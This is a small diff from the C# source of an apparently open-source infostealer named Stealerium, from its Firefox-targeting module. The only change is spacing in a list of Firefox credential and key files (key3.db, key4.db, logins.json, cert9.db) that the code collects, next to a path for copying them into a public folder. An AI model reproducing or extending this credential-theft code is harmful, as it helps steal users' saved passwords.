@@ -13,7 +13,7 @@ namespace Stealerium.Target.Browsers.Firefox
 
         private static readonly string MozillaPath = Path.Combine(SystemDrive, "Program Files\\Mozilla Firefox");
         private static readonly string CopyTempPath = Path.Combine(SystemDrive, "Users\\Public");
-        private static readonly string[] RequiredFiles = {"key3.db", "key4.db", "logins.json", "cert9.db"};
+        private static readonly string[] RequiredFiles = { "key3.db", "key4.db", "logins.json", "cert9.db" };
 
         // Get profile directory location
         private static string GetProfile(string path)
